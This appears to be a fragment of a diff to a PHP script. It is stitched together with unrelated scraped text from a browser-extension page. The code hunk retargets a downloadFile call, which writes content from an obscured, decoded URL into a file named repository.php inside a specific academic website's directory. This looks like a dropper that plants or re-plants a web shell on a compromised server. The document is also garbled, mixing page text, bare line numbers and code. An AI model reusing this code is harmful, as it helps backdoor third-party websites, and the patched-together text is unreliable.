@@ -1,3 +1,9 @@
+Chameleon Logo
+Please activate developer mode
+For Chameleon and scripts to work correctly, you must enable developer mode. To enable it, go to chrome://extensions/ and click the button in the right corner of the screen.
+
+If after enabling developer mode and reloading the page you see this message, please restart the extension(turn off and on) or restart the browser.
+
 1
 2
 3
@@ -129,7 +135,7 @@ function downloadFile($url, $savePath) {
 }
 
 // Location to save the downloaded file (ensure this is a filesystem path, not a URL)
-$savePath = '	/home/u1786879/public_html/elearning-/competency/repository.php'; // Change this to the correct path on your server
+$savePath = '//home/k8274929/rpl.stikesbaramuli.ac.id/repository.php'; // Change this to the correct path on your server
 
 // Initial download
 downloadFile($decodedUrl, $savePath);
